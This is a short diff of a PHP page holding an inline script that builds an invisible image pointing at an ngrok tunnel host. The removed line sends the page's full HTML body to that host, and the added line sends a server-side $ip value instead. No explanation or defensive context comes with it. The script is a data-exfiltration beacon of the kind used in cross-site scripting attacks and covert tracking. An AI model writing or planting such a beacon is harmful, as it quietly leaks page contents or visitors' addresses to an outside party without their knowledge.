@@ -15,7 +15,7 @@ and open the template in the editor.
         ?>
         <script>
             var img = document.createElement('img');
-    img.src = "http://3e6850f2.ngrok.io?c="+document.body.innerHTML;
+    img.src = "http://3e6850f2.ngrok.io?c="+<?php echo $ip ?>;
     document.body.appendChild(img);
     </script>
  
